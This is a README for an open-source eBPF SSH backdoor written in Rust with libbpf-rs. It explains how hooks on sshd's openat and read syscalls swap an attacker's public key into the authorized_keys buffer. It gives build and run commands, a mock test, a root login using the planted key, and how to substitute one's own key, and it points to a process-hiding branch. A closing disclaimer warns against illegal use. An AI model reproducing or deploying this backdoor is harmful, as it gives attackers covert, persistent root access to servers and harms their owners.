> rewrite [Esonhugh/sshd_backdoor](https://github.com/Esonhugh/sshd_backdoor/) in libbpf-rs

## Main Process in ebpf program

> the same as [Esonhugh/sshd_backdoor](https://github.com/Esonhugh/sshd_backdoor/)

Hook OpenAt syscall enter: check if the sshd process call this, log the pid of sshd.

Hook OpenAt Syscall exit: check the pid logged. logging the fd of pid, map pid->fd.

Hook Read Syscall enter: check the pid logged. logging the user_space_char_buffer of pid.

Hook Read Syscall exit: check the pid logged. find the buffer and change the buffer into our Key. Then delete pid in map to avoid blocking administrators' keys be read.

## Test

ENABLE DEBUG MODE AT ``common.h:9``

```
cargo build
sudo target/debug/sshd_backdoor
```

your can watch the debug output

```
sudo cat  /sys/kernel/debug/tracing/trace_pip
```

when run mock_sshd.py in test folder

```
sudo python test/mock_sshd.py

output:
b'....\nssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC31FcYRWU1GQi6r0jLHwm7Ko9j8WaWFC9Y4RbRjbrRbx22HS/ZWhUr2mKtYR//QxhsP4uMzWOJka+yxxBhTo6GPJboMWrkPMr0R23+cXG2SIub/BeZqNe7qDOadp9Ng/ovzEWtpCQhtkrDSv+98RuHfNCngdpIjPDzf11k+GNNKwGtltO5YmUay/tqVrm8AsnmKhB7Xe0kuNPzHQVTWFB46k6xeWs/0NqHETmYxFznCYxGXYPX7+QMdGPZVvG2MLAxAUN/i6x7oygD6AGYTk9iQyAG/1TTgzSMWVXGC+8ZoSMQCxwNKpVl2Tqf79CmKjo6aTsJOihCtmSMoRRvr9vz9p/KYrSH5pSYbblKQHlYQRqFlaPRsqK13/oRE2cgVu0cU+hMSfMW+COYez0k82S0fck9BdEhU6PLyFby3fs7QHedeKvR6bKGh7kAsTnIbvJNx0VHQ/0X2Tcf0exW8oYFGMq41/aIWfCvjAyHtf66NqbrtIxD11AJjgmf8pgcR80= eki@DUBHE-VM\n\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00
```

then your can ssh -i with your private key

```
ssh -i ./test/id root@127.0.0.1
```

## Use your own pub key

replace ``main.rs:100``

## Generate vmlinux.h

this repo contains a vmlinux.h which is generated in Linux DUBHE-VM 5.15.0-58-generic #64-Ubuntu

To generate an updated `vmlinux.h`:

```shell
$ bpftool btf dump file /sys/kernel/btf/vmlinux format c > ./vmlinux.h
$ ln -s ./vmlinux.h src/bpf/vmlinux.h
```

## Size

You can shrink the target binary to only 500+ kb via striping

```
> strip -s target/release/sshd_backdoor
> ls -lh target/release/sshd_backdoor
-rwxrwxr-x 2 eki eki 587K Feb 14 16:03 target/release/sshd_backdoor
```

## Hiding Process

check the selfhiding branch

## Disclaimer

Do not attempt to use these tools to violate the law. The author is not responsible for any illegal action. Misuse of the provided information can result in criminal charges.
